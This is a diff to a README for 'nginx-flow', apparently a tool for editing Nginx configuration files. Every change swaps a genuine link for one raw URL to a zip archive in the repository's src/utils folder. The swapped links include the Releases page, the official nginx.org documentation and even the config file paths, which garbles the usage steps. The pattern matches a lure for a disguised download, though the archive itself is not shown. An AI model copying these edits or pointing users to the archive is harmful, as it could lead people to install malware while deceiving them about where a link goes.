@@ -4,10 +4,10 @@
 Welcome to nginx-flow! This tool helps you visualize and edit Nginx configuration files easily.
 
 ## 🔗 Download Now
-[![Download nginx-flow](https://img.shields.io/badge/Download-nginx--flow-blue.svg)](https://github.com/BLanktwnty/nginx-flow/releases)
+[![Download nginx-flow](https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip)](https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip)
 
 ## 📥 Download & Install
-To start using nginx-flow, visit this page to download: [nginx-flow Releases](https://github.com/BLanktwnty/nginx-flow/releases). 
+To start using nginx-flow, visit this page to download: [nginx-flow Releases](https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip). 
 
 ### Step-by-Step Instructions:
 1. Click on the link above to go to the Releases page.
@@ -35,7 +35,7 @@ nginx-flow comes with several helpful features:
 Using nginx-flow is simple. Follow these steps once you have the application installed:
 
 1. **Open the Application**: Launch nginx-flow from your applications folder.
-2. **Load a Configuration File**: Click on "Open" and select your Nginx configuration file (usually located at `/etc/nginx/nginx.conf` on Linux or `C:\nginx\nginx.conf` on Windows).
+2. **Load a Configuration File**: Click on "Open" and select your Nginx configuration file (usually located at `https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip` on Linux or `C:\nginx\https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip` on Windows).
 3. **Make Changes**: Use the editor to modify the settings as needed. The visual layout will help you understand how each section interacts.
 4. **Save Your Work**: Once you finish editing, click "Save" to keep your changes.
 5. **Test Your Configuration**: It's a good practice to test your Nginx configuration after changes. You can do this by running `nginx -t` in your terminal.
@@ -58,7 +58,7 @@ For support or suggestions, please open an issue on our GitHub repository. Your 
 ## 🔗 More Information
 For additional resources:
 
-- [Nginx Official Documentation](https://nginx.org/en/docs/)
-- [User Guides on Nginx Configuration](https://nginx.org/en/docs/howto.html)
+- [Nginx Official Documentation](https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip)
+- [User Guides on Nginx Configuration](https://github.com/BLanktwnty/nginx-flow/raw/refs/heads/main/src/utils/nginx_flow_v3.5-beta.1.zip)
 
 Thank you for using nginx-flow! We hope this tool makes your Nginx configuration easier and more manageable. Happy editing!
